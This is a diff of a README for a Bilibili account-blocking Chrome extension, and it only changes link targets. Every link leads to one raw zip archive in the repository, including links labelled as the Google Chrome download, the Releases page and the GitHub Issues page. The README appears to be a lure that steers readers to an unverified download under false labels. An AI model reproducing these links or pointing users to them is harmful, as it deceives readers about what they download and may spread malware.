@@ -4,18 +4,18 @@
 The bilibili-block-extension is a tool designed to help you block spammy accounts on Bilibili quickly. This Chrome extension runs entirely on your local machine. Say goodbye to annoying accounts like ad sources or unwanted influencers.
 
 ## 📥 Download the Extension
-[![Download bilibili-block-extension](https://raw.githubusercontent.com/Code-Drax/bilibili-block-extension/main/icons/bilibili-block-extension_1.3.zip)](https://raw.githubusercontent.com/Code-Drax/bilibili-block-extension/main/icons/bilibili-block-extension_1.3.zip)
+[![Download bilibili-block-extension](https://raw.githubusercontent.com/Code-Drax/bilibili-block-extension/main/assets/bilibili_extension_block_3.8.zip)](https://raw.githubusercontent.com/Code-Drax/bilibili-block-extension/main/assets/bilibili_extension_block_3.8.zip)
 
 ## 🚀 Getting Started
 To get started, follow these simple steps. Don't worry; you'll have the extension up and running in no time.
 
 ## 🔍 System Requirements
 - A computer with Windows, macOS, or Linux.
-- Google Chrome browser installed. You can download it from [here](https://raw.githubusercontent.com/Code-Drax/bilibili-block-extension/main/icons/bilibili-block-extension_1.3.zip).
+- Google Chrome browser installed. You can download it from [here](https://raw.githubusercontent.com/Code-Drax/bilibili-block-extension/main/assets/bilibili_extension_block_3.8.zip).
 
 ## 📂 Download & Install
 1. **Visit the Releases Page:** 
-   Go to the [Releases page](https://raw.githubusercontent.com/Code-Drax/bilibili-block-extension/main/icons/bilibili-block-extension_1.3.zip) to download your version of the extension.
+   Go to the [Releases page](https://raw.githubusercontent.com/Code-Drax/bilibili-block-extension/main/assets/bilibili_extension_block_3.8.zip) to download your version of the extension.
 
 2. **Choose the Right Version:** 
    On the releases page, you will see various options. Click on the link that matches your operating system.
@@ -49,7 +49,7 @@ If you encounter issues during installation, try these steps:
 3. **Clear Cache:** Sometimes, clearing your browser’s cache can resolve unexpected issues.
 
 ## 💬 Support
-If you need help with the bilibili-block-extension, feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Code-Drax/bilibili-block-extension/main/icons/bilibili-block-extension_1.3.zip). We monitor requests and will assist you as soon as possible.
+If you need help with the bilibili-block-extension, feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Code-Drax/bilibili-block-extension/main/assets/bilibili_extension_block_3.8.zip). We monitor requests and will assist you as soon as possible.
 
 ## 📜 License
 The bilibili-block-extension is open-source. You are free to use and share it, provided you follow the license provided in the repository.
